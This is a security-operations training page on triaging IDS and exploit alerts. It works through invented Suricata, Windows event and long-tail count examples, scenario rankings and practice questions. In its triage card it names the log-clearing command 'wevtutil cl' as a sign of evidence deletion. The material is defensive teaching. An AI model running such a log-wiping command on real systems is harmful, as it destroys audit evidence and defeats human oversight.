docs.title: Prioritising Alerts — IDS and Exploit Alerts, Same-Stage Alerts, Unique Alerts and What Can Wait
Prioritising Alerts — IDS and Exploit Alerts, Same-Stage Alerts, Unique Alerts and What Can Wait
docs.text:
What this page covers

The first two pages of this section gave you the rules (dangerous = near completion, high-value target, targeted attacker, unique) and the clues (exfiltration, destruction, sensitive targets, targeted tells). This page puts them to work on real-looking queues. First a seven-alert IDS queue read only from signature names and hit counts — with a full Suricata eve.json alert broken down field by field, and the reasoning for each alert's rank (sinkhole callbacks, outbound TFTP, xp_cmdshell against an internal SQL server, a packed download, a mass-mailed executable, an internet-of-things scan). Then what to do when every alert is at the same stage: six questions (what does the exploit give, did it work, what happened after, what asset, where, which user) applied to four exploit alerts. Then a six-scenario exploit discussion — Log4Shell on a patched DMZ server, an exploit kit in a browser, Zerologon against a domain controller (with the 4742 and Netlogon events that show it), a planted USB stick (6416), password guessing against an external HR portal (4625 sub-status codes) and a macro document sent to the help desk. Then long-tail ("least frequency of occurrence") analysis with a 90-day alert count built line by line, the lower-priority alerts that are mostly noise (and how to tell a misconfigured service from a brute force), and a one-card triage checklist. Practice questions with explanations at the end.

Labels

[Supplement] = practical material you need to know, [Correction] = a commonly repeated claim that is wrong or outdated, [Changed]/[Caution] = what has changed recently and what is risky to do the old way. The company (Kestrel Logistics), hostnames, accounts, domains, IPs, signature names and log lines are invented for illustration (.example, documentation and private IPs). Signature names imitate the style of public IDS rulesets but are not copied from them.

docs.title: The 8 key points
docs.text:
1. Read a signature name as a kill-chain stage. Recon scan → early. Delivery (an attachment) → early but maybe wide. Exploit → middle. Installation / C2 / lateral movement / exfiltration → late. Late beats early.
  2. The hit count changes the meaning. One hit on a bad domain may be a single redirect that failed; twenty-two hits on a sinkhole mean a host that is really infected and keeps calling home. One xp_cmdshell attempt on an internal server is serious; a thousand scan hits on a camera exploit you don't own is noise.
  3. Outbound protocols you never use are a gift. If nothing in the company sends TFTP (or FTP, or SMB) to the internet, a hundred outbound TFTP alerts is probably data leaving — check it first.
  4. When everything is at the same stage, rank by consequence: what does the exploit give (admin? user? crash?), did it work (patch state, what happened next), what kind of asset (internal server ≫ DMZ server ≫ ordinary laptop), where (production ≫ test), and who (admins, engineers, finance, executives, help desk).
  5. An exploit against an internal crown jewel also tells you how far the attacker already got. Zerologon against a domain controller implies they are inside, found the DC and staged tools — the attack is near its goal.
  6. Long-tail analysis: alerts that fire most are usually rules to tune; alerts that fire least — especially ones never seen before — are where new attacker behaviour shows up. Mind how the rule counts (per packet vs per connection).
  7. Usually not urgent: external port scans, most policy violations, a few failed logins, single unauthorised-access attempts, and bare "bad IP" matches. They happen all the time, by accident, or are low fidelity. But "excessive" against one server needs a check — and rule out a misconfigured service before you call it brute force.
  8. The triage card: How far has it progressed? Any exfiltration, destruction or evidence deletion? Could it be targeted? Is it unique here? Pick the alert with the worst answers, then move on to validating it carefully.

docs.title: Why this matters in a SOC
docs.text:
Rules are easy to agree with in a classroom. The hard part is a Monday morning with 300 alerts, seven of them in front of you, and no time to open all seven properly. You need to be able to look at a list of signature names and counts and, in a minute or two, say "this one first, this one second, these three can wait" — and be able to defend the choice afterwards.

Think of a mechanic listening to a car with five strange noises. They don't fix the noises in the order they heard them. A squeal from the brakes beats a rattle from the glovebox, even if the rattle is louder and started first. The mechanic knows what each noise means for the car. In the SOC, the "meaning" of an alert is its stage, its target and its rarity — and the skill is reading those from very little text.

This page practises that skill on three kinds of queue: a mixed IDS queue, a queue where everything is the same stage, and a queue of exploit scenarios. Then it covers two shortcuts (long-tail analysis and knowing what can safely wait) and finishes with a checklist you can use on any queue.

docs.title: Worked example 1: a seven-alert IDS queue
First, what an IDS alert actually contains
docs.text:
In a real queue you'd have the full alert, not just a title. Here is one of the seven alerts below as Suricata writes it to eve.json (one JSON object per line; shown pretty-printed and shortened):

{
  "timestamp": "2026-11-23T08:14:07.331245+0000",
  "event_type": "alert",
  "src_ip": "10.10.0.53",
  "src_port": 53,
  "dest_ip": "10.20.4.57",
  "dest_port": 51544,
  "proto": "UDP",
  "alert": {
    "action": "allowed",
    "signature_id": 9100231,
    "rev": 3,
    "signature": "KL DNS Reply - Known Sinkhole Address",
    "category": "A Network Trojan was detected",
    "severity": 1
  },
  "dns": {
    "type": "answer",
    "rrname": "upd-check.kl-cdn.example",
    "rdata": "192.0.2.250"
  }
}
  • timestamp — when the packet was seen, with time zone. Always check the zone before you compare with other logs.
  • event_type: alert — Suricata writes many event types (dns, http, tls, flow…) into the same file; this line is a rule match.
  • src_ip 10.10.0.53, src_port 53 → dest_ip 10.20.4.57, UDP — this rule matches the DNS reply, so the packet travels from the internal resolver (10.10.0.53) to the client. The host to investigate is therefore the destination, 10.20.4.57 — the one that asked. Always work out which side is the client before you pivot; for reply-based rules it is the reverse of what you might expect.
  • alert.action: allowed — the IDS only watched; nothing was blocked. (An IPS in blocking mode would say blocked.)
  • signature_id, rev — the rule's number and version. You use them to read the rule itself, tune it, or search for every other hit.
  • signature — the name you see in the queue. Rule authors usually start with a vendor/category prefix (KL DNS, ET POLICY…), then what was seen.
  • category, severity 1 — the ruleset's own classification. Severity 1 is the highest in Suricata's scheme, but remember from the first page: severity is the rule's opinion, not this event's danger.
  • dns.rrname, dns.rdata — the domain asked for, and the answer: 192.0.2.250, which (in our invented world) is a sinkhole — an address run by researchers or a registrar that took control of a malicious domain so infected machines call it instead of the attacker.

So the full alert already tells you a lot more than the title: which internal host, which domain, and that nothing was blocked. The exercise below uses only titles and counts on purpose, because that is often all you see at the queue level — and it is enough to make a first ranking.

docs.title: The queue
docs.text:
Seven signature names from Kestrel's IDS for the last 24 hours, with the number of hits each:

# Signature (invented) Hits I1 KL DNS Query to Suspicious Dynamic-DNS Domain (*.dyn-host.example) 1 I2 KL DNS Reply - Known Sinkhole Address 22 I3 KL SMTP Inbound ZIP Attachment Containing .scr Executable 50 I4 KL POLICY Outbound TFTP Data Transfer 100 I5 KL SCAN Network Camera Firmware Exploit Probe 1,000 I6 KL WEB_SERVER MSSQL xp_cmdshell Attempt in URI 1 I7 KL MALWARE Packed Executable (rare packer) Download over HTTP 1

Let's go through them one by one, asking each time: what stage is this, did it get anywhere, and how many people or systems does it touch?

I1 — one DNS query for a suspicious dynamic-DNS domain. Someone's computer asked for a name that looks malicious. Two possible stories: the computer is infected and asking for its C2, or the user was redirected there (a malicious ad, a compromised site) as part of an exploit attempt. We don't know whether the site was even alive or whether anything downloaded. One query fits the redirect story better — infected machines usually ask repeatedly. So this is most likely delivery/exploit stage, possibly failed. Look later, and check whether the same host has other alerts. (ATT&CK if it turns out to be C2: T1568 Dynamic Resolution and T1071.004 Application Layer Protocol: DNS.)

I2 — 22 replies pointing at a sinkhole. At first glance it looks less bad than I1: the domain is now harmless, because the sinkhole doesn't send commands. But the count changes everything. Twenty-two lookups mean a program on that host keeps trying to reach its controller — that is C2 behaviour from an infected machine. Malware often carries a list of fallback domains, so it may soon try one that isn't sinkholed. High priority: the installation stage has already happened.

I3 — 50 inbound emails with a ZIP containing a .scr. A .scr is a screensaver file, which is really just a Windows executable (see dangerous file types). This is delivery stage (T1566.001 Phishing: Spearphishing Attachment) — early, but it reached 50 people, and each one is a possible infection. Fast to work: check the mail gateway for delivery status, pull the message from mailboxes, and if you can, analyse the file to find the domain it calls so you can search the proxy and DNS logs for anyone who already ran it. Medium priority — early stage but wide.

I4 — 100 outbound TFTP transfers. First question: does anything at Kestrel legitimately send TFTP to the internet? Almost certainly not — TFTP is a simple, unauthenticated file-copy protocol used inside networks for things like network-device configs and PXE boot. A hundred hits means this has been going on for a while. What is being sent? It could be confidential data. This is possibly active exfiltration (T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol) — check it first.

I5 — 1,000 hits of a camera-firmware exploit probe. Kestrel doesn't run that brand of network camera, and the name says probe — it's reconnaissance (T1595.002 Active Scanning: Vulnerability Scanning) aimed at something you don't have. Internet-wide scanners do this all day. The thousand hits come from the rule firing on every probe. Bottom of the list.

I6 — one xp_cmdshell attempt in a web request. xp_cmdshell is a built-in Microsoft SQL Server feature that lets a SQL user run operating-system commands — if the account they control is privileged. Seeing it inside a URI means someone is trying to push SQL through a web application into the database and from there onto the server's command line (SQL injection leading to command execution: T1190 Exploit Public-Facing Application, then T1059.003 Command and Scripting Interpreter: Windows Command Shell; enabling or abusing stored procedures for persistence is T1505.001 Server Software Component: SQL Stored Procedures). Now assume the target is an internal web server in front of the shipping database. Then someone is already inside and moving towards a server that holds sensitive data. Yes, it could be an admin doing something odd — but the potential damage is huge. Top priority, level with I4. If the target were a DMZ server, it would be lower (internet noise), though still worth checking whether the request got a 200 and a large response.

I7 — one packed executable downloaded over HTTP. A packer wraps an executable so it unpacks itself in memory when run — a bit like a self-extracting ZIP that stays runnable. Attackers like packers because they also hide the code, so strings and signatures see little (see strings and packing) — T1027.002 Obfuscated Files or Information: Software Packing. An executable arriving like this is the installation stage; if antivirus doesn't catch it, C2 follows quickly. High priority, level with I2 — both probably mean an active infection.

docs.title: The ranking
docs.text:
Rank Alert Stage Why here 1 I4 Outbound TFTP ×100 Exfiltration (possible) Protocol never used outbound; long-running; data may be leaving now 1 I6 xp_cmdshell ×1 (internal server) Exploit → command execution on a sensitive server Attacker already inside, going for data; one hit is enough 3 I2 Sinkhole replies ×22 C2 from an infected host Installed malware retrying; may switch to a live domain 3 I7 Packed EXE download ×1 Installation Likely becomes C2 soon if not caught 5 I3 .scr in ZIP ×50 Delivery, wide Early, but 50 possible infections; quick to contain 6 I1 Dynamic-DNS query ×1 Delivery/exploit, probably failed Single hit fits a redirect; check for related alerts 7 I5 Camera probe ×1,000 Recon against something we don't own Constant internet background

Notice two things. First, the highest count (I5) ended up last and two single hits (I6, I7) ended up near the top — counts only matter together with stage. Second, I1 and I2 look like the same thing (a bad domain), but the count flipped their order. With only titles and counts we already have a defensible plan; the next step is to open I4 and I6 and validate them.

docs.title: When every alert is at the same stage
docs.text:
Sometimes the queue is a pile of alerts that are all the same kind — say, eight "exploit attempt" alerts against different hosts. Stage no longer separates them, so you go back to the basic question: if this one succeeds, how bad is it? Six questions help:

  1. What does the exploit do if it works? Remote admin (SYSTEM/root) access, ordinary user access, or just a crash (denial of service)? An exploit known to give remote SYSTEM with no login — the SMBv1 family behind EternalBlue is the classic example (EternalBlue) — goes up.
  2. Did it work? If the target is patched against that exact vulnerability, lower it slightly: someone dangerous is attacking, but hasn't succeeded yet. Don't know the patch state? Look at what the host did straight after the attempt.
  3. Is there evidence of what comes next? A new process, a new service, an outbound connection to a strange address, a new account — any of these right after the exploit means it probably worked.
  4. What type of asset? An internal server is the worst case: the attacker is past the perimeter and going for valuable data. A laptop with no sensitive access is lower. An old exploit against a DMZ web server is internet background noise unless it shows signs of success.
  5. Where is it? Even inside, subnets rank differently: production servers and manufacturing/OT ≫ test networks.
  6. Who is the user? Admins and people with sensitive access — engineers, scientists, finance, executives, and the help desk (broad reset and admin rights) — first.

docs.title: Applying the six questions
docs.text:
Four exploit alerts from the same hour:

Alert Target Q1 gives Q2/Q3 worked? Q4–Q6 asset / place / user Rank E1 SMBv1 remote code execution attempt KL-FIN-DB01 (10.30.8.21) SYSTEM, no login Patch state unknown; outbound 443 from the server 40 s later Tier-0 database, production finance subnet 1 E2 Same SMBv1 exploit KL-TEST-07 (10.70.1.7) SYSTEM Patched (inventory says so); nothing after Test lab, no data 3 E3 Old web framework RCE attempt KL-WEB02 (DMZ) Web-service user Response 404, nothing after Public web, constant probing 4 E4 Browser exploit attempt KL-WS-0219, user a.chen User-level code EDR shows no child process Laptop, but a.chen is a payroll officer 2

E1 wins on every question: maximum access, a sign of success, the most valuable asset. E4 beats E2 only because of the user — a payroll officer can move money, so even user-level access is valuable. E2 and E3 can wait, but they aren't closed: E2 means someone inside can reach the test lab, which is worth asking about once E1 is handled.

docs.title: Worked example 2: six exploit scenarios
docs.text:
Six descriptions, deliberately short. With only this, which one would turn into serious damage fastest?

S1 — Log4Shell exploit string sent to a DMZ web server. Log4Shell (CVE-2021-44228) let an attacker make a vulnerable Java logging library fetch and run code just by getting a crafted string logged — so it can mean full control of the server. But: a patch has existed since December 2021, the server is in the perimeter network, where you expect constant random attacks, and you hopefully patched it. If patched, fairly low. Check: did the server make an outbound LDAP/RMI/DNS lookup to the attacker's address right after (the tell that the lookup was triggered)?

S2 — exploit kit against a user's browser. An exploit kit is a web page that probes your browser and fires an exploit that fits (exploit kits). Modern browsers run page code in a sandbox with restricted rights, so a single exploit usually ends with very limited access — at best the same rights as the user. Chains of several exploits can escape the sandbox, but that is rare. Users shouldn't be admins on their daily account. Relatively low in this list (T1189 Drive-by Compromise, T1203 Exploitation for Client Execution).

S3 — Zerologon attempt against a domain controller. Zerologon (CVE-2020-1472) abused a flaw in the cryptography of the Netlogon protocol so that an attacker with network access to a DC could set the DC's own machine-account password to empty — and from there take over the domain in minutes. This is the clear top priority, for two reasons: the exploit itself is devastating, and it tells you about the past — to send it, the attacker had to already be inside, find the domain controller, and stage tools. They're attempting to take everything. (T1210 Exploitation of Remote Services, followed by T1003.006 OS Credential Dumping: DCSync in typical use — see DCSync.)

What it looks like on the DC's Security log — 4742 ("A computer account was changed"):

Event ID 4742  Computer: KL-DC01   2026-11-23 09:41:12
  Subject:          Security ID  ANONYMOUS LOGON
                    Account Name ANONYMOUS LOGON
  Computer Account That Was Changed:
                    Account Name KL-DC01$
  Changed Attributes:
                    Password Last Set  11/23/2026 9:41:12 AM
  • 4742 fires on a DC whenever a computer account object is changed (when "Audit Computer Account Management" is on). Machines change their own password regularly, so 4742 by itself is normal.
  • Subject … ANONYMOUS LOGON — the change was made by an unauthenticated session. A real password change is made by the computer account itself (KL-DC01$). Anonymous is the Zerologon fingerprint.
  • Account Name KL-DC01$ — the account changed is the domain controller's own machine account. If that password is reset, the DC can break its own replication — and the attacker now knows the password.
  • Password Last Set — the attribute that changed.

Patched DCs also log Netlogon events in the System log when a device tries the vulnerable (non-secure) channel: 5829 (a vulnerable connection was allowed, during the compatibility phase) and 5827/5828 (a vulnerable connection was denied, for a machine or trust account). A burst of 5827 on an enforced DC means somebody tried Zerologon and was stopped — still a sign of an attacker inside.

S4 — a planted USB stick plugged in. Hard to predict on purpose: the damage depends on who plugged it in. Most employees are not administrators, so statistically it probably doesn't give dangerous privileges straight away — but plug it into an admin's machine and the story changes. (T1091 Replication Through Removable Media, or T1200 Hardware Additions for "keyboard-emulating" devices.) Windows can record 6416 ("A new external device was recognized by the system", with the device ID and class) when Plug and Play auditing is on — useful to tie the time to a user and host (services, tasks and USB).

S5 — password guessing against an external HR website. A trick entry: this isn't an exploit at all. Either the attacker gets in or doesn't — but even if they do, an HR portal doesn't give them a command line or a way to run malware directly (T1110.001 Brute Force: Password Guessing, or T1110.003 Password Spraying when one password is tried across many accounts). So it is the least immediately dangerous route to privilege escalation in this list. However, once in, the attacker can use what they find — bank details, org charts, who reports to whom — for tailored phishing or payroll fraud. (See the [Caution] box below: in 2026 the answer depends on whether that portal uses your single sign-on.)

S6 — macro document sent to the help desk. Similar to S2: Word runs as the user, so whatever the macro does runs with the user's rights — if they aren't admins, the attacker gets user-level access (T1566.001, then T1204.002 User Execution: Malicious File). [Supplement] But look at the recipient: help-desk staff often have rights to reset passwords and admin access to many workstations (see sensitive users). "User-level" on a help-desk account can be far more than on a warehouse clerk's. Add to that the 2022 change where Office blocks macros in files from the internet by default, and S6's real priority depends on the account and whether the macro could run at all.

The order: S3 clearly first. Then S6 or S4 depending on who is involved (help desk / admin). Then S2, S1 (if patched), and S5 last for immediate damage — while noting S5's later fraud risk.

docs.title: Unique alerts: long-tail analysis
docs.text:
Another way to choose where to start: the alert with the fewest hits. The idea is simple. Whatever happens most often in your environment is, almost by definition, normal for it — so it's rarely the attack. Something that has never fired before is new, and new behaviour is where an attacker shows up: a determined intruder doing things that have never been done on your network should trigger rules that have never triggered. This is called "least frequency of occurrence" or long-tail analysis. It is an anomaly-focused technique built on the fact that alert volumes follow a Pareto-like distribution — a small number of signatures produce the vast majority of alerts.

Let's build the view from an export of 90 days of alerts (alerts_90d.csv, one alert per line, signature name in column 3):

$ cut -d',' -f3 alerts_90d.csv | sort | uniq -c | sort -rn | head -4
 412933 KL POLICY DNS Dynamic Update from External Network
 188201 KL SCAN Inbound TCP Port Sweep
  91544 KL INFO TLS Session Ticket Reuse
  40312 KL POLICY Cloud Storage Client Detected
$ cut -d',' -f3 alerts_90d.csv | sort | uniq -c | sort -n | head -4
      1 KL POLICY Windows PE/DLL Download from Low-Reputation Domain
      1 KL EXPLOIT Kerberos Pre-Auth Downgrade Attempt
      2 KL MALWARE Unusual Beacon Interval to New Domain
      3 KL DNS TXT Record Response Larger Than 1KB
  • cut -d',' -f3 alerts_90d.csv — split each line at commas (-d',') and keep only the third field (-f3), the signature name. (Real CSVs can have commas inside quoted fields; for those, use a CSV-aware tool, but the idea is the same.)
  • sort — puts identical names next to each other, which uniq needs.
  • uniq -c — collapses each run of identical lines to one line and prefixes the count.
  • sort -rn — sorts by that number, numerically and reversed (biggest first). head -4 shows the top four.
  • The second command uses sort -n (smallest first) to show the tail.

How to read the two ends:

  • The head is where tuning work lives. 412,933 "DNS dynamic update from external network" alerts in 90 days isn't an attack — this kind of rule commonly fires when a DNS server or DHCP setting is misconfigured, and a quick search of the rule's documentation usually confirms it is a classic false positive. Fix the configuration or tune the rule.
  • The tail is where you look for trouble. "Windows PE/DLL download from a low-reputation domain" is labelled POLICY and looks dull. But if your policy is "users don't download executables", and you investigate the one hit and find the file came from a domain with no history, this single policy alert can lead you straight to an infection.

Counting depends on the rule

Long-tail analysis doesn't always work cleanly, because rules count differently. Some fire once per connection, some on every matching packet, some are thresholded ("alert once per 60 s per source"). A single attack can therefore show as 1 hit or 4,000. Before trusting a count, know how that rule counts — and consider counting distinct hosts (cut -f3,5 … | sort -u) rather than raw hits.

docs.title: Lower-priority alerts: what can usually wait
docs.text:
Every environment has a steady background of alerts that are noise or accidents. They're low fidelity: a single condition that could be bad but is usually innocent. At low numbers you can't tell an advanced attacker from a mistake without a big investigation that finds nothing 99.99% of the time.

Alert type Why it's usually low When it isn't External port scanning The internet scans everyone, constantly A scan from an internal host; a scan followed by an exploit that gets a response Most policy violations People break policy by accident all the time A policy alert that is also rare and points at a bad domain (the long-tail example) Failed logins People mistype passwords Clearly excessive, many accounts from one source, or failures followed by a success Unauthorised access attempts Someone clicks a share they can't open Repeated, against sensitive data, by a service account "Malicious IP" matches IP lists are noisy: shared hosting, CDNs, cloud, recycled addresses Combined with other signals (beacon pattern, new domain, odd process)

General rule: if it happens all the time (scanning, policy), by accident (failed login, access denied), or rests on low-fidelity data (IP matches) — don't put it first.

docs.title: Excessive failed logins: misconfiguration or brute force?
docs.text:
The one in this list that can become urgent is a flood of failed logins against one server. Before calling it an attack, rule out a misconfiguration — it's very common. Windows logs failures as 4625 ("An account failed to log on"). Two short samples:

Event ID 4625  Computer: KL-APP03
  Account Name: svc_scan     Logon Type: 3
  Failure Reason: Unknown user name or bad password.
  Status: 0xC000006D   Sub Status: 0xC000006A
  Workstation Name: KL-MFP-2F   Source Network Address: 10.20.2.40
  (repeats every 300 s since 2026-11-20 14:00)

Event ID 4625  Computer: KL-RDS01
  Account Name: admin / administrator / backup / scan / test / j.moreno ...
  Logon Type: 3
  Status: 0xC000006D   Sub Status: 0xC0000064 (most) / 0xC000006A (some)
  Source Network Address: 203.0.113.61
  (3,140 events in 25 minutes, 410 distinct account names)
  • 4625 fires on the machine where the logon was attempted, every time a logon fails. Attackers trigger it when they guess passwords; admins trigger it when they forget to update a saved password. (logins covers it in depth.)
  • Logon Type: 3 — a network logon (SMB, for example). Type 10 would be RDP, type 2 at the keyboard.
  • Sub Status 0xC000006A — the account exists, wrong password. 0xC0000064 — no such user. Many 0xC0000064 = someone guessing account names.
  • First sample: one account, one source (a multifunction printer KL-MFP-2F), a perfectly regular every 300 seconds since the day the svc_scan password was changed. That's a device with an old saved password — a misconfiguration. Fix the printer's scan-to-folder setting; and note that it can lock the account out (4740 "A user account was locked out").
  • Second sample: hundreds of different names, mostly non-existent, from one external address, thousands of attempts in minutes. That's brute force / spraying (T1110). Then the key question: is there a 4624 (successful logon) from 203.0.113.61 afterwards? If yes, this jumps to the top of the queue.

docs.title: The triage card
docs.text:
There is no rule that works 100% of the time, but these four questions, asked in order, will rank almost any queue — and the more you use your tools and know your environment, the faster your intuition gets.

TRIAGE CARD — ask for each alert (or group of linked alerts)
1. How far has it progressed?          recon < delivery < exploit < install/C2 < lateral < goal
2. Exfiltration, destruction, or evidence deletion (or preparation for them)?   → jump the queue
3. Could it be targeted?               alert name, target asset, detection family, context, threat intel
4. Is it unique / unusual here?        lowest count, never seen before, rare in the world
Then: who/what is the target? (asset tier, subnet, user role)  → final order
  • Line 1: post-exploitation is always more important than pre-exploitation.
  • Line 2: actual or prepared exfiltration or destruction — and deleting logs (wevtutil cl, 1102 "The audit log was cleared"), which only happens after the attacker has done something worth hiding — goes straight to the front (log clearing).
  • Line 3: targeted attackers jump the line because they adapt and persist. Threat intelligence often helps decide whether a malware family or infrastructure belongs to a targeted group.
  • Line 4: listing all alerts over a long period and reading the bottom reveals attacks you'd otherwise overlook.

Once you've chosen the most pressing alert, the next job is validation — deciding whether it's real. That sounds simple, but how our perception and memory work, and how SOC pressure interacts with them, makes it easy to get wrong. That's the next section.

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

Reading alerts as kill-chain stages, letting counts adjust (not decide) the meaning, ranking same-stage alerts by access gained, success, asset, location and user, long-tail analysis of rare alerts, and knowing which alert types are mostly noise — all of this is still exactly how good analysts work a queue. Zerologon and Log4Shell remain in CISA's Known Exploited Vulnerabilities catalogue and still appear in scanning and in unpatched environments, so the S1/S3 reasoning still applies. The 4742 / Netlogon 5827–5829 and 4625 sub-status reading is unchanged.

[Changed] What has changed

  • IDS engines and rulesets. Talos stopped publishing rules for older Snort 2 versions in 2024 and recommends Snort 3; Emerging Threats still publishes ET Open/ET Pro for Suricata and supported Snort versions. Most network detection today is Suricata or Zeek, often inside an NDR product — the alert anatomy above (eve.json) is what you will usually see.
  • Entity- and risk-based queues. Many SIEM/XDR platforms now group alerts into incidents per host or user and add risk scores, so the "queue" is often already partly linked. Your judgement on stage, asset and user still decides the order inside that list.
  • AI triage agents. Vendors now sell AI "SOC agents" that read alerts and propose verdicts. Gartner (2026) predicts that by 2028 about 70% of large SOCs will pilot them for Tier 1/2 work but only about 15% will see measurable improvement without structured evaluation, and the SOC-CMM 2026 survey found only about 10% of SOCs rate the value they get from AI as excellent. Useful for enrichment and summaries; the ranking logic on this page is what you should check their output against.
  • Macros are not the main Office route any more. Since Microsoft began blocking internet macros by default (2022), attackers moved to LNK, ISO/IMG, HTML smuggling, OneNote and "paste this command" lures. A macro alert on its own is now less likely to run, but the recipient logic of S6 applies to every such lure.
  • ATT&CK v19/v20. Technique IDs used here are unchanged; defence-evasion techniques such as T1027 now sit under the Stealth tactic (TA0005) since v19 (April 2026).

[Caution] Wrong or risky to do the old way

  • "Password guessing on an external portal is lowest priority" is often wrong now. If that portal signs in through your single sign-on or a cloud identity provider, a correct guess is a working identity for email, files and VPN. Treat spraying against SSO-backed apps as identity compromise risk, check MFA results and successful sign-ins from the same sources, and watch for MFA-fatigue prompts.
  • Don't auto-close the "low-priority" classes without sampling. Excessive failures, internal scans and rare policy alerts are exactly where real incidents hide; let automation close the bulk, but review a sample and anything with a follow-on success.
  • Don't trust raw counts across rules. Per-packet rules inflate, thresholded rules deflate; count distinct hosts and know your rules.
  • "Patched, so lower" assumes your inventory is right. Verify patch state (or the post-exploit behaviour) before you lower an exploit alert on an important server.
  • Don't let an AI agent's verdict replace the triage card. Check that its reasoning covers stage, target and rarity — not just the signature's severity.

docs.title: Question 1
docs.text:
Rank these three and explain: (a) KL DNS Query to Known Phishing Domain ×1 from a laptop; (b) KL DNS Reply - Known Sinkhole Address ×35 from the same laptop over two hours; (c) KL SCAN Inbound SSH Brute Force ×6,000 against the DMZ jump host, all failed.

Answer and explanation

(b) first, (a) second, (c) last.

  • (b) 35 sinkhole replies over two hours = a program on the laptop keeps calling a C2 domain that has been taken over. That means installation already happened (C2 stage), and the malware may switch to a live fallback domain at any moment. Isolate / investigate the laptop.
  • (a) A single phishing-domain lookup could be the same infection's origin (a click) — check the timing against (b). On its own it's delivery stage and may have failed.
  • (c) Internet SSH guessing against a DMZ host is constant background, and every attempt failed. Confirm there's no successful login from those sources and leave it — unless the jump host accepts passwords at all, in which case fix that.

docs.title: Question 2
docs.text:
You have four exploit alerts at the same stage. Which six questions do you ask to order them, and why does an exploit against a domain controller tell you something about the past as well as the future?

Answer and explanation

The six questions: what does the exploit give if it works (admin, user, crash), did it work (patch state), what happened right after (new process, service, outbound connection, account), what type of asset (internal server, DMZ, laptop), where (production/OT vs test), and who is the user (admin, finance, engineer, executive, help desk).

An exploit against a DC — such as Zerologon — needs network access to the DC, which is normally only possible from inside. So the attacker must already have got in, explored the network, found the DC and staged tools. That means several kill-chain stages have already passed: it's both a devastating exploit and evidence that the intrusion is far along. On the DC, check for 4742 with ANONYMOUS LOGON changing the DC's own $ account, and Netlogon 5827–5829 in the System log.

docs.title: Question 3
docs.text:
Your long-tail view shows KL POLICY Archive Upload to Personal Webmail with 1 hit in 90 days, and KL POLICY Cloud Storage Client Detected with 40,000. A colleague says "both are just policy, skip them". What do you say, and what do you check before trusting the counts?

Answer and explanation

The 40,000-hit rule is a tuning candidate — something common and probably approved (or at least normal) is firing all the time. The single "archive upload to personal webmail" hit is at the long tail: rare, never seen before, and it describes a possible exfiltration step (archive + upload to an uncontrolled service, compare T1567). "Policy" in the name doesn't make it harmless; look at it first among the policy alerts — who, which file, how big, what else that host did.

Before trusting the counts, check how each rule counts — per connection, per packet, or thresholded — and count distinct hosts/users rather than raw hits, so a single noisy machine doesn't make a rule look common.

docs.title: Perception & Memory
docs.text:
In one line

You've chosen the alert; now you must decide whether it's real — and this is where good analysts most often go wrong. This section explains why, using the psychology of analysis: perception as an active filter, mindsets that form fast and resist change, seeing what you expect, how the typical SOC workflow and SOC pressure push towards premature closure, and then the limits of short-term memory, how experience and long-term memory help and hurt, and the habits (decomposition, externalisation) that compensate.

docs.title: Reading order
docs.text:
# Page Key points 1 Perception and Analysis — Heuer's Argument, Mindsets, Seeing What You Expect, and Why the SOC Makes It Worse Why validation goes wrong; Richards Heuer and Psychology of Intelligence Analysis; inherent vs deception-induced uncertainty (T1036.005, T1070.006, T1070.001, T1102); unmotivated, unconscious bias and why awareness isn't enough; perception as an active filter (mindset/mental model); mindsets form fast and resist change, assimilation strongest when ambiguous, confident, committed; the fresh-eyes effect; the ambiguous-figure and selective-attention examples; the five-step intuitive workflow and the disconfirming question; the SOC formula for premature closure; a VPN "scanner noise" case followed evidence by evidence (spraying T1110.003, MFA fatigue T1621, 4624 type 3, 4648, T1078/T1021.002); a "known false positive" 4688 pair (parent, token elevation, SQBFAFgA = IEX); eight practical countermeasures; practice questions 2 Memory and Experience — Working Memory Limits, Decomposition and Externalisation, Assimilation, and Mental Ruts Sensory store, short-term and long-term memory; encoding and retrieval; 7 ± 2 and the newer ~4-chunk estimate; chunking; why relationships (n(n−1)/2) overflow working memory; decomposition and externalisation, six formats; a service-install case worked in the head and then as full case notes (7045, 4624 + 4672, 4688, Zeek conn/dns, T1543.003, T1569.002, T1036.004, T1071.001, T1133, T1078, T1021.002); the parked/dismissed list; mind map; assimilation vs mnemonics; learning auditd by mapping it to 4688; pros and cons of experience, mental ruts and five SOC examples; hardened mindsets and failing to re-evaluate earlier evidence; practice questions

Section complete

The perception and memory section is complete. Next: Mental Models — encapsulation, the OODA loop, the Kill Chain, defence in depth, NIST CSF, the incident response cycle, threat-intelligence cycles, the Diamond Model, attack trees, the Pyramid of Pain and MITRE ATT&CK — the models this section says you should collect.

docs.title: Things to remember
docs.text:
1. Validation, not triage, is where most wrong closures start.
  2. Uncertainty is both natural (missing data) and planted (deception) — expect both.
  3. Biases are unconscious; knowing about them doesn't remove them. Process does.
  4. Perception is interpretation through a mindset; your mindset forms in seconds.
  5. New evidence gets fitted into the first theory — most when data is ambiguous and you're confident and committed.
  6. You see what you expect; the unexpected needs more evidence to be noticed.
  7. Ask "what would show I'm wrong?", not "does it fit?".
  8. Write down your hypothesis and an alternative; re-read the whole case before closing; use fresh eyes.
  9. Working memory holds ~4–7 items; investigations hold hundreds of relationships. Decompose and externalise.
  10. Keep a parked/dismissed list and re-check it when new facts arrive; experience builds both skill and ruts.

docs.title: Memory and Experience — Working Memory Limits, Decomposition and Externalisation, Assimilation, and Mental Ruts
Memory and Experience — Working Memory Limits, Decomposition and Externalisation, Assimilation, and Mental Ruts
docs.text:
What this page covers

The previous page showed that perception is a filter. This page looks at what that filter is made of: memory. Your mental models live in long-term memory, and every investigation is worked in short-term memory, so the way memory works directly shapes the quality of your analysis. We cover the three stages of memory in Heuer's model (sensory store, short-term memory, long-term memory), the famous "7 ± 2" limit of short-term (working) memory and what newer research says about it, and why a real investigation — hosts, users, IPs, processes and the relationships between them — blows past that limit within minutes. The fix is decomposition (break the problem into parts you can understand one at a time) and externalisation (get it out of your head into notes, tables, timelines and diagrams), and we do both on a worked case with a full set of case notes, reading the log lines field by field (7045, 4624, 4672, 4688, Zeek conn and dns). Then the fastest way into long-term memory — assimilation, tying new information to something you already know — with a concrete example of learning a new log source by mapping it to one you know. Finally, the two sides of experience: speed and pattern recognition versus mental ruts, the extra effort of unlearning, and the habit of never going back to evidence you set aside earlier. The 2026 view (AI copilots as external memory, ATT&CK's own model changing under you) and practice questions close the section.

Labels

